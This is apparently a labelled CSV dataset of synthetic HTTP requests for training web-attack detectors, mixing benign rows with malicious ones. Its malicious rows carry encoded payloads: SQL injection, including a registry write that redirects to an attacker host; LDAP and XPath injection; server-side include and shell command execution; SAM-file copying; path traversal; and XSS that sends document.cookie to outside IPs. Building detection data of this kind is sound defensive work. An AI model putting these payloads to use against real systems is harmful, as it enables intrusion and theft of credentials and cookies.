Method,URI,Host-Header,Host,Label,Data
GET,/riLXjKegesi.eH/nxnode/HtKpr3CL/y-BrYtYrnUKVYEi75y9.js,HTTP/1.0,www.wzfvIls.gov,1,nh2preo7behp=AND+++ascii%28lower%28substring%28%28SELECT+++TOP+1+++Nuns++FROM++++sysobject+++WHERE+++xtype++%3D++%27U%27++%29%2C1%2C1%29%29%29++++%3E+++++111&r7zrsybt0r=yFotoek6&gg=uaef&elAl=227&K0lvnYJh57hm=nmldhtAsm%26&iEms8ikpXedaaee=s4ifbflogn%24texecan1t
GET,/i859-eQdzub_1bgT2/ddlocationnY/-5H4/0ohsrsynoounnloasl/reSqhuffsstngldAu/wjgUJKSyvH1tnwv6gnw/k.H5CQc6aSHWY4/e0C2C_eWXDHbJHzjO/encN4dnen5a/dt5bdhsofsmveV/EoRKgroup byfrom1WformifO8/rnt.pl,HTTP/1.1,www.tqpAurQvo.fr:251,0,tAcAeecuPo=%5Dre%7C&lti4aGr7eytga=SPet&corre=gr3hJ4t&shttewEaL=iexectua2e8epsem%27ucy&uiusrotdzphih=8468&ia4aIrfQss9=13081961&epiaet=534
GET,/tq1jnZZAA19NOvv/tErqahuengaLg4/2wkt/onoxSetTenqe/opTba5eBe/fhpPtcdcn/b7bfU_2j1T/7vpornnA/o1/taf3f6gn/-Wi6likereplaceMx0/mjada.asp,HTTP/1.0,www.oefr.net,1,64a=wkZ988h&Zetey=98%29%28%26%28objectClass%3D4sfo%29%28%7C%28sn++%3D++++ca%29%28cn%3DgfT+++++J*%29%29&W@T8=eoopenN&ooi=7af&sthsugnroHien=e&tshiodseh=7367&oexdphuecnd=document%7Ccho5t%3F%2Bsboot.inis&niUeaaELnodFa=bpd%29ies&bkelen2ME=fb7aderepornaaiy&M1bzt4Js.j=608979&fTmCUMIot=mrm&rowllphcrTpea=%2FAncoptg&zsea9urmjrz=t4jtauo3&IiMaa=tgc%5Cew4ahreade%25aeedf&XRHxp_6ynS=61692
PUT,/1qq4loewkto8o94/vBayQTOHRz.html,HTTP/1.0,www.ih4Cio.it,1,zLhFM4OebftpN=ftt&sBr6mog0uacsvea=lhI)(    |  (rtuw=*)&sandxtermC=os0yeueotnwfelAf
GET,/xp_.6fvs7EiGODm/qN/sekMFwK7aCIMRakt-Td/BXgkall/s6BD_tg7BF6N/Pm/t5Pz/eQJ/wQepwe1reobrq4ai/daer/eiYdmiVJ_higIF1RK9zB.jpeg,HTTP/1.0,255.101.10.163,1,ERDnps=cdniu&lsi=ne3JZz4oO2i&y.JiGc=c1sI54Ym%40_&etcS-y=o0UpEiframeumaile4fIlia&a76houenmnoc=acceptrziT&NM-FmNEVxmlTUl=nsh&we=821133&irtw=%7Ehu8Hlt%7Ciuilceexec%26
GET,/nxwi3rvdfrebsiuT/ecyKXQs1H/arroFo/oTIgdiilpmddmc/cjvrOzgyE/inzFxYIM8TVL/bel2heHoCit/uiqshutdownjgroup byV/_zjC/eo/u2zkV-2al_2IYy/tchir5qlmtrs.htm,HTTP/1.0,112.155.69.246,0,rndEl4lkee3Tcn1=tou&rnss7imeyhd=5&GY7VTT=uiahnsnoia&H5includeeCetcZ1DBB=ngcOiire7e&cp=0717&3lgay8aveey=hvP&mhnndodaopl=t&tmeefa=vlrs&imTB=7tct
GET,/bYRDDi3CvL4rS.aspx,HTTP/1.1,249.15.76.139:28879,1,6rrxtteHneqi=mntyW&okufqs8yei=018&hesWrnfnr=bh%29No&tencat8=%3C+ttpbgreyI%3Exyi&8YrviI8jy=5fa&oSiel=4&HUEb5=and+++0%3C%3E%28select+count%28*%29+++++from+++hszst+++where++iL%3C%3E%29&ADqaPuw=96494&iJ=O&a6treauNHh=295785&rx=qtaceoepf4koooo
GET,/r6hdKqj5B-oQmj.tiff,HTTP/1.0,www.mialk.be:0120,1,ABAnodewmL=OR++++%27sstXg%27++%3D+++++N%27+++++%27&vehoniig=ptiphphn%25oatad&CTWtF=7991&iiecgeh=161&hsnoedndI=rti
GET,/np8@-VNr4/vbscriptTb5C7vYHN/onullQnp/v7/6jcmd.nsf,HTTP/1.1,www.0beqo.org,1,esbwrtsseG2=%3C%21--%23echo+var%3D%22date_gmt%22--%3E&thb6ubrtAine8=5602&YmeZHexzj=797
GET,/cO6VRWXhZfB/hLfn3435ouThI/goH@DqDP/2BHboot.ini/xMhJ3aKpX/metfxet1OaDdom2Ag/e4n9EocdEi9romo8/reeoe8iHw5m5PJKMDW@g/tyayteqs7oieth/nrnrtasocahI1eb/93lyEuone.sh,HTTP/1.0,15.195.62.2,1,hleuslPsn=%2Ft&srj6yu6csT=gnnea%5Cengll3rusra2tn%26u&Giehou=%27++++%3Bps+++-aux+%3B
GET,/eesttong8eiyTta/u4zCdUilJt/hDk/0ne3nkzEa0hoe/tinCRcBoYstOYJzTN4/atSe/lpCDGbOnull/6otaan4ei0ax1tvt/ho8UsUzdiXxMJL9A/ab1YSfpVoepd/rXa2DUH..jpeg,HTTP/1.0,www.I2yanwrr.net,0,cW8oF=i8kwr&dm=Naao7+maHla&sgS86eorxza=shservicesntba&aI4f7ep=rlsha&@xp_ij-metawinnt=oOrhtpesin&s1nrdoesnnah=4&raEeelatse9uoH=3586607213&rn=d%40S3UYxY&rEoqd2eynrhbtsr=stnnjel&7ahu2eaeejnu=niRrointsseats
GET,/eyoatnntt/TUa/lhreufbrdip.js,HTTP/1.1,www.boiuljeg.st,1,SQS-z3rzqaccess_logPC=%28l%2Fm+srwhereQtw&dt=38&0VKwp-8divOX0=%3Axipi&Eg3QueI@g_kor=7twue&y7rhheaq=rGUR&ss4=%27++OR+%2799he%27++%3C++++%27X&imte=erObbtvugu-M&s7nhe4i=srwnca%3Fo%26hsrEsm&nEgsos5baqu2iIh=4653205&Ptz0osennTfa=aBiUJG3&vsthj7=da%3Cszslib%5Dh
GET,/bpecde1t0il37hnBen/onJgihnb/RcsI9/bedo1meeb9qeiRd/wBJyYdsXrweZFjOG_w/OT/r1B8jgn3uOyOR0FY@O/WPuIWux9YRVt.html,HTTP/1.0,198.36.206.176,1,esio=%3C%21+%23%3C%21--+%23exec++++cmd%3D%22id%22--%3E&inec5ot=dgl&sheenen=85727&sp_s=ue3shalreiesti&a7iEtvrntyilr60=s6jvU-HO2&F3nX=j2tsNl&reh=457075813
GET,/efftsOnGheLlttotr.gif,HTTP/1.1,www.eoDxtms.st:810,1,id6jeO1putp=5906&kTvstfafsrso=576&u6loozYcp=c&LsTuf_admintCS=v1hwc%29%28+++%7C+%28p1a%3D*%29&ndHidIjnsmn1bKI=oexecy-eirlciradmin&ha=wner4n&dagaebslcicwcT=aeo7&snim6rezal=ozwehi3DnmEaet%5Cobject7&Nrrtt6enflYhec=760855886&fHi0aenli=353903&te=9066116&rdomeps=18649434&beaaaoel=xfsjnaistbxnu%2F
GET,/nndatatquR/uNJrmzzbeDRO@XKK-/ohJOT6nMwqv8/whEiNvAHaa/tnateg4apqe7o/a3XkDq_a.jpg,HTTP/1.0,www.tly3t.org,1,Dsoehhe0neos=22.49.228.97++++%7Ccopy+c%3A%5Cwinnt%5Crepair%5Csam._+c%3A%5Cinetpub%5Cwwwroot%5Csam.ddd&.idD=5542
POST,/ntcwrmrdIpNuodiao/openCMy/@rtB2/hops8wp-Wwhere/ac-r/ttldcccsAioSii/noec4loIO/6ydessujpg4nnnn/omIi/Oamvne8ycoiiz/e6.dll,HTTP/1.1,www.mafsret.st,1,5teshnRsan4su2=tAaHeqrop&Ttnoh11spnap=5981)(&(objectClass=otte)(|(sn    =e9h)(cn=t     J*))&1teoh=820344
GET,/tnr2xysdloAsNbhehos/u0d-OMx/cmdlkjxA1n/glnccneaceraysdha/eTdIyRTc.xhOgFPu2/naqsas0it6beih/tJ.php,HTTP/1.1,75.159.109.223,1,grgcrnan=a2h&cdt=3HbcAW&3nythiegpPE=C%2Ft%2Fe5me7%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D6%5D+++++or++%27tedtt2s%27%3D+++%27&rmezlrxnrSeik=0450&hlcl=7856&TetcaRpV=e%2BseamilikeeaxC2s5&hesrt1Hqci=i4xGEDpu
GET,/s3z7stRswme0OGq/cTi_Bfu@/ot2ezeelteXei8ryR/idot/ssthlsRtes5sfi/6lnlQled/a9iQKydNyxrXAdX/e0MyXIf4zV0yREhrYk/TtwOkLLoiniSLhd/@t8OXFJZKi6like/jIvHjbgsoundPIR4-k/SdehtgeeuH.png,HTTP/1.1,www.tNHhint.it,1,eecPirhV=4855432905&anarcjlaFuEnn1e=sonaE18Tmhwreihra&af=gey&snoFinswW=244.37.67.91+%7C+copy+c%3A%5Cwinnt%5Crepair%5Csam._+c%3A%5Cinetpub%5Cwwwroot%5Csam.ddd&IDNB=69478
GET,/tt_m3dn9Bs/hvFP_fcAMQNK/eiiieeztrtoo9omtetn/@TDX/uxLzNgGHeCugnmVHCy7e/EAetcULJbK/aB/Twp-adminb/sAYcvGeOqaWQK/ahai9e/mmMZ9pFzptZ.gif,HTTP/1.1,124.254.210.5,1,3frnad=r3eo&rpTQeemO=dzwr&lsjP37NGpdk=6pi&eoHxdeesamjw=nbicoeglUeNlslbSr&etmesbaCnOf=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&gdteivOoearXTga=2517365&rr9a4ml=s5sn8fe&rbtdoiHeleYo=7&ttrwls1xmdyhi4r=kiintxtgedwytea&aeFwtotsj=17
POST,/eqasmthea1alu5a/nE@p3BhzfOc./yv8a42ts7da/_KUodLcatkuLhwp-4/fxlIeEx0/schoao2t8iAkbnchoqe/py.A.1jmXX_c3Bo/e3anS/tSg@yxJo343zSy/rToontpEvastEyody6/ejl/8w_.js,HTTP/1.1,210.13.167.111,1,trnIumrnrgdsitt=OR     'Snnis0' IN    (''   )
PUT,/tsNKmXOa/sPr@0lRgCoC9aueCom.dll,HTTP/1.1,www.Rvshvweq.be:80,1,pterledtaOt=qe~ew7eetes&cMoaslhaDnkcIa=08EV&acbeYNtge0Nburu=oi6logm|9&dgaBntpxnnHetu=37571408&nrxoy=203&e7oi='(toeeslstylelgroup bysuoHel|d &riaegdlll=rm7a5iiiiincuh33e&tyitdreslg=4&7eI4vyjeja=)   ( |(displayName=had*)   (name    =  had*)(   mail=had*)&tdnLsIbeapsiF=uIy1bXtmA&u5tnin6rn=818484190
GET,/tJ7uwxn@/wwrdil/peEoEntinflq7d.dll,HTTP/1.1,11.55.19.194,0,aemoinhws=tt.h9sI&lryes=m6passwdea&ge7kiq5hh7ePio=88199166&pyXgv1Ka4xhv=saccess_loghis
GET,/rJqNCEiN/sotieyns/urVEe9kcHxvV7iP1T/pHJukl-YRw.mdb,HTTP/1.0,194.167.92.56,1,0leqr4as2lle=etent%2FA8lpns%2FtC5e%2Fchild%3A%3Anode%28%29%5B+++position%28%29%3D32%5D+%7C++o%2FxZrsa%2FtakcE%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D703%5D++++or++++%27hhtc%27%3D%27&-fromFbgsound0.ucxKx=elr2cueevsethidldu
GET,/XXyAL6X/sQQkLDxj-7Ss/mKb5y_xDwURAFpZ-DXnI/dgtjC5dXOm2OWb3/erHo5Ba/yNimdatIns.css,HTTP/1.0,www.sntdlu0D.org,1,fmmreagr=lwjityl&otr=cn70deseh&ee51dzTaonmtEt=%29++%28++%7C++++%28cu%3Dmz7e*%29
GET,/mggtmacj/ePuB1ibj4pEH5e1Ota_/9emibAu/ep/vrethburot.js,HTTP/1.0,www.snlhg2.be:80,1,.V3Hn_-yRVn8=lo4uprgo9s&rgeeOvots=oBcjwV&iayO3=+n&nSylD8=%40ep&partd0ge=a3&e0eukdnxfi3=89789629&sli8hoYtuce=udh+euho%2FYhw&hgltH2Csgeoexed=esOa4r%3Cl1hSqt&lsdeletez94OX=nwWrYY1&aqIayu=1&uJi0htpass=tnO%28nrqEies%28%29Npw&.GcatWRexeciM=canYWvN&4omt=%3Cimg+src%3D%26%7B%5Bwindow.open%28%27http%3A%2F%2F217.82.118.204%2Ftige.nsf%27%2Bdocument.cookie%29%3B%5D%7D%3B++++%3E&ekoln9rcwo1=oirlink5h&access_logl7OOsamJ=1411449898
GET,/hstdArxowebe5pie/lea/is-Ruprocessing-instructionWTswzzEU/iDr/05ucr5DDIpl.UoS9ILHe.jpeg,HTTP/1.1,www.oestzAsae.ch,1,DformJT=%27++%2F**%2F+OR+++++%2F**%2F+%273u8%27+%3E+++++%27S&gsns5Apschep=eiearnss&0ds=oHnsnadh&aoaLnabR8jRr8t=8340852991&uycrsIsedTi=17&etyin5cgnoep2=D4ieiqoodu&i06Ktbysoe6ft=lq74Q7W&xnjewro=+n8rtdprbhwo&pdeoTraxpmitdit=529&MuzRqVN2it=luouryuEle&tftlcseeROtsbw=netcat%40cZ&.t9jmetaimg69=eaXJYugmC49&lcm6uef4fomi=7a&orE@qHbF6Odo=sPb%27ii+t-ecopy%2Fclidn&gQNo7G=8478887
GET,/iyycWszoithtbnt/gnloaedNsoahoz/ePQPOZRJSbM5JsWVY1m/lrnCfNdirpSeidnu7/LcsgUdtnibocllkf4.html,HTTP/1.1,100.83.56.134,0,2he9=rebn%27&oce=373023&8peyretwcaa=2&ar=deletebil
GET,/RKNXf9XstjE90hQ/eYmowF5h.9a2/smbedoevaphnb9/Rj183LP/kebpinea/kbeeaeLre/9g.-9Yk8/czZC2BM/ects4etescbBzirrtgem/eof/ahntbcs/aGIVX0zP_q4v.html,HTTP/1.0,242.35.23.132:80,1,ddmtsEr6ameo=dnLu&UnxSEhe8i=0203&rtWdoRltt=5315444&ds7tieshsce=22316368&acvsLeb=%3C%21--%23echo+var%3D%22date_gmt%22--%3E
GET,/2jPmailperlyXBYRLP.html,HTTP/1.0,171.65.188.55,1,wWe6gC3I05KF=%3Cimg+++src+%3D++++%22++javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F117.158.117.52%2Fnggeal.mspx%27%2Bdocument.cookie%29%3B%5D++++%22+%3E
GET,/Is8mwteeoP/Ai19w7toport8eMrOT/uxfthhceuRw/VlSVpNeVlQ-/rfCREYiK9d2Z/wv2n0NY1hwa/Edac8nsotobuulep/c4eaordw0ftf/@roinserth/eHdrRzEchGSwkA/mspho/ThQGJcy6AMGfDY.asp,HTTP/1.0,172.212.216.217,1,tceefWeteO4te=1dns+&8lOMtsfse6wne4a=nes4usri7ewio&OelEopmBah=744&bfHnetcatMvar67vE85=%29++++%28+++%7C+++%28++++cn%3D*o+%27brien*++%29%28mail++++%3D*o%27brien*+++%29++
GET,/jest6urbmn/FFnph-HNoWlC/oaV/rGYrxJRAXcrwwB5p6B/YS@rDRxkr7_EeQo.php4,HTTP/1.0,140.41.121.45,0,hrl=d3.&ecc=+rkcuhScgrxtermbinMah&rutl=3&nt=ahnfhshaa1hechoqqsami&s9wehd=hesatg%2F%28nenvz
GET,/KKautoexec7E@havingXqDW/nqFJmK3.eKBnr/iaoiEsDdEba6artetR/zP8PyBnO4GWzTF/hleahknar/p8yhfl/htpass2KTzOJFtXniqfa/kmenprnnakyhcE/dseinSaa.jpeg,HTTP/1.1,www.a1ra1s.fr:80,1,tiyIdie9Hceh=rsg&gJ-kJOQ3xxmP=seEliswttfecho&_5A.m9-U=bs7to5i7uKt&unionLvfjU9mC=++++%3B+++++echo++%3B++w+%3B+uname+++-a+++++%3Bid&oanee79on=533&t54rwijhNol=t4I-QN&hzioa4zeela5ca=ea&bodyMis=xezah&mw1ttoSaii2=beoitstjph+aboM&oondRoJyTxure=hEnepdhp1hert&aafdZznSol=sfi&oittReat=adtahHks7eesdnsmu&drbLAlgl=93243921&ae6=3086049
GET,/68gFtaSsiYt/wOzdiiZ/Iv/oR6/tlS/bOmscCA.Gn8qbhtn/qGpv/czV-_WLYtzgf0qu/dqchgmZNVGmucxK.exe,HTTP/1.0,117.201.255.177,0,gadh2yg=7MT5aZ&Uf5RBZW@I=onie6OochbetweenO&ydvi8iNqn=htacceshavinguh&tym46twirdizsea=roe%3Dromm0a+&iwiawstu=az5Ebm&qhusga39md=0aormirennehipositionEepse%2Be&td3nmu8on=p.VCvQuzR
GET,/egZoTbbLfH_X8Db/d_n9bJCkOPVK1U/echo7nonAboot.ini/aJkgCeCK5l1z4yKwfD/dm/h2zeoo.php3,HTTP/1.0,11.121.82.202,0,eigmnuebstaot=bL9FU82OGRc&eserreunnm=e-gkom&X8MZZsOAM=%40&ouvatpt8dfAdcte=Deabtoi2IiKms&eoI=eni4u%7Ehtpassnrgij4&4qTtyaateeRi=oTgom+ttgco&egiogroir=7940&netatmoEi1ra=iceh
PUT,/1E1k/3rz/ii/ayfsEzwKHhLkrSY1/yV.SU@tx@.gif,HTTP/1.0,135.226.61.208:2,1,"etiEb=tEeop&bf=t4xieusrZcqins&ig=L&Cbeezmta0ioAhi=femnc&dubpona1n0T4e=230451&anaeooeehRhh=712&wget8WWbn_4v=133&i7tgto1riE=t3aMojDxn&5eiR=exec  xp_regwrite    'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\MSSQLServer\\Client\\ConnectTo','tlehltb','REG_SZ','DBMSSOCN,hackersip,80'&gR@7w1=rUrsehnc&Si=4&lLac=iP2GBlfW"
POST,/ip/toipt8mey5oos.gif,HTTP/1.1,www.irdona2.fr,0,tsjrdnasUonih=78&aeAbtekgs=rKr0yskKk06_
GET,/o2cbpaKON4sBQ9UDK/tcgctjgs5kfTet/eoeeb/5sod.jsp,HTTP/1.0,30.145.254.129:80,1,elorrepH9Ceofe=a5lnph-a&PChvbscriptchXvEn_p=%3Cscript+%3Ealert++%28+++%22++te3r.brvn%22%29%3C%2Fscript%3E
POST,/ahrtotwcfl0st/.9wW/9dacleneopptx8afl/A1locationoWbgsound@NKmpassthruoTKy/mFi6jjUFaIN/bfNye8ewfO/Kog3stdin/n99ilerdbrdads/OBhxtfk6elog.js,HTTP/1.1,95.137.240.181:80,0,gNsfdyn=a' s0dnsztoigia&jiIreatuaaslrE=67340630&vedansr=dptEe&tm14lif2dule=nrmbyS&lcujninsertoxterm9E=randswI8hnH&st=63&qIdmrehc=Isefemictudc&sogb=t swth3t&wphieNu=84
GET,/mNhhusr/rDfceS_iqg/eoRaho5laTStToSVt/ahnxz/qtPR.b-scriptMQstding/nipec2ia8eniksjs0Ie9/AumcashaSJhnneWacim/Fec7eonieP.mdb,HTTP/1.1,209.249.145.36,0,rp2tslvf2=0&TmltxcnupimAM=41aio%2BailstTo%5Bhe&qlaydmv=riidn&9d5RF=eny2%2Fiadlo&hoc=962&nfTatixaatturm=220954&qe0=stdin&d0pwp-psnph-eYivbscriptwhereU=LatNpsfaxm&yutsa4onueii=seGR8%40CAF&nont=oittemnr%3Ee8nn
GET,/dFf/i5wgsNsaiotject/m8mailn1Y/Sv/pY93lGhiSs9VaTkYLPZ/tooHlnis/pYMh.html,HTTP/1.0,www.inttd.com,1,eageh4qatg=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&hQmL4Z5execwG0=im7p
GET,/ialan3pfdittk/hDAbxjSwEc/fg-Nx/N8WRfznullTQB4MwB@/WservicesRLxVDvNkxgroup bywinntJf.jpeg,HTTP/1.0,27.145.46.113,1,naomw=m8%27++++UNION++++%2F**%2F+SELECT+gureegkrt++++FROM+++++dba_users+++WHERE+++++tpsh++like++%27%2525
GET,/B2Q.vart/amuIlnmwxsoesz/sGf@fa7D/nidBebxzfVM7_6c/qlqt8vCg2935Dl/r6j/aG5A6.XYC2di/ApLV6aQzSxmlhvpY/nsmE1aisaebDofeea.tiff,HTTP/1.1,238.158.165.73,0,gRu.nullwgf.boot.iniA=931612334&mlaSIg=115
GET,/HqZbkLpEkQ7/rc7OAr/ssh8lay/3N7oL6xx/a_FhzYIv4WEf/0dyangtm/3winrnr1esnAe.swf,HTTP/1.1,www.astro.be:94,0,hw=gdJPgGTFwS&snbidctf=nWbhU&irfrtcnedtk=127173&l8ytmsdcithccpl=7341550689&lub=20670&astil89od22=22oerodfeiiya&fromUv-Pls8-0L=okd&mastla=50509186&rcpDEadminoKLn_e=38556&wwrsoet=bfa
POST,/i1pE4/SepASbry0tcSgRis/e1ShHM7Gd.MqZPlg/eEY2hKPwS9FvNUJr/6tzntt5g7huesototh/GKstdinKdkl-7/CTxvk.png,HTTP/1.1,www.15docYhasc.biz:80,1,yfhstn=32808971&4iqutw=tUgnh&0h=22611&MAgKiN7=himfajtxbnynfe6o&RDdperlandTq=tY9_aH6eKA&oetgykuauu1m=<div  style='binding': '   url([http://www.in.com/script/ndsbtfut.asp]); ' >&eoddnomirthhlyl=6SD9UxB3j&sldaretI3=eerho&ceo=nenolrib&rOrD=esho&ueitlteI=cTnF04gCZedx&cs84raHEahtIQte=nxN.4uh5
GET,/boovsfihah5avrsoAten/7snpr/5yddolftimkQdewti20/tioBnbiolt4dt/V6vbscriptM2L.shtml,HTTP/1.0,www.imXts8rqoe.gov,1,ecew8tzso90mb8=9ltaeaLvbnls%27&zJ6K7ZB=45&sae=eQnk&e05erqbm=eeFel7eeaDoblrnSns&slyqhtmsqcUtaR=254269&ceN3usteHh=3583136&dihwah=5537793011&odeNuane6emble=zQne3a%27%5D+++++%7C++P++++%7C+%2F%2Fuser%5B++++name%2Ftext%28%29++++%3D%27gtlC&vanseOoeyebo=8641&6ojBz=ehBESIFQdHpu&szmr8nhd=s1kkIcfr&p5boot.inixSpt0=77699&php48CY=ioreplaceform%2Bsftpan1r9&inputCQtwherelocationWV=93670
POST,/vNlWt-Y_C.i/rt/kdmp6ekoah8heac1r/divZbetweenxMftav1wzwp-/3qkAu_/nbiCu.XdK1if9ag4/QbJE/nlnnfnnst98/tmb87tiqjwpoe/fUch7iIc2hbAH/rzMN/replaceIoGd3a_OLE.htm,HTTP/1.1,187.50.111.118,0,utu=cmho9l352
GET,/aK00/NzoA3yftjtxev0judra/0xRCCBmrzQ/hmdmhndtse3nofelrAd.jsp,HTTP/1.0,www.igxpsI7.gov,1,ett=d6L7&tA2e5cmdohD=tdm8nsemerdbohta&hTehelkdeEj=Iit3a+%5Denranu&rlawddsoeNitmn=62798980&6oevalQz@XtXbP_=xae&iet5ainceei8na=bZ962Jjuf&GwyUGeb4RNl3=eo2rousad&uRuyfteicoxy4ee=tyetpinnhhgssbfz&el11oaad=i&RR0cfp=86906&htaccesnZ.mU=369054&7tnt=trRdMhOc&It6nxi=y%2B&UBpS6=%3Cxml++id+%3D++++%22++++X%22+++%3E%3Ca++%3E%3Cb+%3E%26lt%3Bscript+%3E%5Balert++++%28%27Bremle7arr%27%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa%3E%3C%2Fxml++%3E&rte=n%3De9
GET,/t4fVxL4wp-fni/CPAhredoeddyt/f3v0f7CC-fq7.Vx/uQvHb71LC6aITWgpn7/o9HtBnzjL/l9/32yv.js,HTTP/1.1,207.215.112.197,1,57et7ifhwRe=101&eoMfElgd=bekeeo
POST,/dI/sdru.pl,HTTP/1.0,214.218.252.244,0,Vtrbstsen=se2rcneorc8kare9ni&bS1nms=ffpjmooaeweL&Hhonoe2eeirks=A2decl7qCsnl8ot&shrdbeeolde1Pm=20424648&U@Ui@Np=eFVOKfjO1x&e5nsofenuvoy=ooona&rrkwmmtSprn4hF=d&dvtanucaTetn=b1W&iddo=028244&8pQSkeu_D=r6sl(&a1=895904&yrcetaeugrsh= ehz&zt01nerM3oe=153
GET,/16imlht6Yee/kNdr.jpeg,HTTP/1.0,www.qoaa8i.uk,1,sf=t+zi%40&D25IUjf=5&s4oltN9sype=7860645&tqibDbiS2pu=2WekBxoBQ&lehgeol=p&nstgo0=7369&leo6rEer5rx=7547592&ii2eq1ee3xgiji=8425&cT1lltAi8cgt4=%27+%29++UNION++ALL+SELECT++++%27o3dha%27%2C4962%2C4775%2C%27wapntx6e%27%2C05+++++FROM+++++sy+++++WHERE++++%28%27%27++%3D+%27&teEhac8n=oCiqdsuqb&GKAtl=ls&o7telnet.28=iew
GET,/eGWYkpuLD0g5/uV-LgT3@jCGunJSP4EX/t9vbMFciSyEJ_JP/nimrwxEgolcoahl/obaesossepRihtb/yoTCG56t/uIkh/rIniS/kXL_toviochild8rd/n1apkaopRyu/1bVEk.Ce2/ssTYitsaridrncEelgR.html,HTTP/1.1,www.dunreb.net:80960,1,tmmqmeOe1ikeRo=oolnotE&6eehdebEetC3ge=859814&589FformX.=3331812931&fsSsnydsdwahes=%29++++%28+++%7C++++%28++cn%3D*o++++%27brien*++%29%28mail+++%3D*o++%27brien*+%29+++&0tto9a4eosnwast=itivitw&a1ieikuitTylnaN=iSat
GET,/to-AY2PJ2T/85jJmeta@@jljdtfI/sbfmAEeBE3D/9jFxrmR@/ir/iK.sop2h2idEyE.N/WH/760Y..sLwo1v/s7cY7PndS3VRuEPOPJ/iaon6eesua2minaaNoit/6ei5coag.htm,HTTP/1.1,www.NeuleracNn.gov,1,0Ech=h_6E&hNmtaHhir=sF5v4aoWhUpz&ozipdcgiaTnj1eO=%28r+tt&t6te4thaC=04839&ddyiiSnd=39834592&0Sjbk6=0iaadD9Anpc5m&ebY1pnOiB=2+++++or++++ltal%2FguRi%2FeecA%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D796%5D+++++or+++578%3D&23Ppen9eE=e0HCQlKXpSJB&onrhaitetehLp=sn&irrtGloetz=jfTeoE3vtr&2oewfhqeyHT8m=o1nmh&rh=9anftpeoK%7E%25&i1su2aNbebr=68726&ept6rl=snftizh4E
GET,/e50UMOmOmZFCg-wU.jpg,HTTP/1.0,www.Vetp.com,1,hgzt=rr&lYrvgjAvizo=5&sLqnUod=horYnprLtne&accepto0v77stdinzKhttps8I=nsefertwad3d&g16e1ohat=466599&oruq3rr1Ln=%3Cdiv+++style+%3D+%22++++binding%3A++url%28%5Bhttp%3A%2F%2Fwww.ic.com%2Fscript%2FT6o.msf%5D%29%3B+%22++++%3E&esSahaut6skdi=lohttps&i8sv=8accept&sOvtoa=fRPPeqTP&0cefycsOgtri=389465&8pxtDoenisO0ha=hislereci0jn
GET,/rPJ79AlVqTz2x82y2zXn/svuSthata/dqPm/0zi4BPDxterm7gD/eh7E2PX2S9/lt/rets/czp/aittaobehl7ilkit/npOt.mdb,HTTP/1.1,9.104.230.241,0,gwj1qZ=Msr8Vasitesen&iwienidydhewe=e6neEmwl&rimt5atznig=aNVdz12&twuazvhoiszpncn=dxVjdAAX&Tiur=2r&1maRseosetn=hl%3F%3Bg%3Dulhrso&d6ateiexr=+eettNeai6pautoexece%7C&ooeogrenos8o8ve=%2Fnthe&ed=a%25urev97Jconnectxo
GET,/cpgtOde2At3ttomlwlen/objectckKV7R0_3pkB2x/nrO6hrtgrserohdeE/-Ja8P-lib7H@lL.aspx,HTTP/1.1,www.ioYqolEec3.biz,1,or30lnDibetlEaa=tygw5CRs2tx&mpli=nzoiTisitkPtn&zElocationN@=81&sPVs5Y=node%29e%5Cinu%7Estdin%7Ci%26h%26&nuetfi65tal5=%27+++++%2F**%2F+++OR++%2F**%2F+%27wtederEt%27+%3E++%27S&ocHttcR=058656&Y6s1oiii=t+jt%5Cpysamg%7Cr+riE&dcwdIEgrOruek=shutdown%26egai&nxj7a8n=956637047&Ueereaoeeecoyae=sUne%25tmochaoe6np
GET,/nBSW4N@AU/nsTquheds4T/96homeVjbbetweenykxc0/hL/euurh5s8VAg3tts/sHnEsuceAo0TE4opelPe/oBr4n_n/YicIR.html,HTTP/1.0,www.ixrahsyT.de,0,RlxO.kY_=39331226&iframeJ3MEPEgQJmocha=mseocdm+%2Be&aeGd0=lzg.BGjBox2i&smochaUW0C=r%26rmhuAurpt5r%29&aOGQWincludeCQlike3=inbl&solg=hee&Nofnej=lRdeh76yhwgetp2i&Paec2wzh6yo1rst=481594&ot=s1s3as&e9c86eugaoh=99880&ui=8823
GET,/ahordtlvarfa9eslul/GQgNF.gif,HTTP/1.0,www.mnojtc.com,1,hsemyhfenpde=4575&xfzI9usr=mrptg9nrptjfFy&jelom=eeuhwssoysz&PhseJden9d=msmt%27%5D++%7C++P+%7C+++%2F%2Fuser%5B+++name%2Ftext%28++++%29%3D++%27zh&cefjoa=28892777&rtNrttetjntwzsT=73958038&9sii=939&oOID=rlgjRU7Z9&0at2VKD=bqfnh
GET,/abO7TWsii_l8X1NzpVf/hmlrQ@P52foD4uKsTn2/sceaotIt/bQ__/eL4tbe/kOP8AwtOnGlsvvGyf2xs/ep/hwre.asp,HTTP/1.1,3.238.135.218,1,eez=+sitere&kh89uece8efe=ddocA9anqdsirn&k599ldxmn=tooalveoon&allPZsaoCmeta=dmkUrr1J%40o&IozEpyhRt=rescodropm&saqShmhoetMne=%27++++%3Bps+++-aux+%3B&2d3nb8tnhex7n=ae%26e%28ia
GET,/wtmmwedearaer/gyihv7joEbcsehrfiitn/nttorspls1n/tsndNectcE2N/9azXG23Nuz/9bfv-IWci/c2orOgi/E@O/lp/DqfqlinkjIu0/Y8Cj1asP1Wp3/oZv.js,HTTP/1.0,244.216.113.65:20,1,twz2ncrkRqe=in+&oiaeDgxp=Das7m&oDatd=desen&rcse=xc9setsnn&oaopw=%27+%29++++UNION+++++ALL+SELECT++84%2C0%2C949%2C271%2C424+++++FROM++t9Hyrhuddt++WHERE+%28++%27%27+%3D%27&Xi=0Hhh9&mafroumTucanu2=wblocationb&or4iIymoahrzu5b=Ur3r&n9m=98002
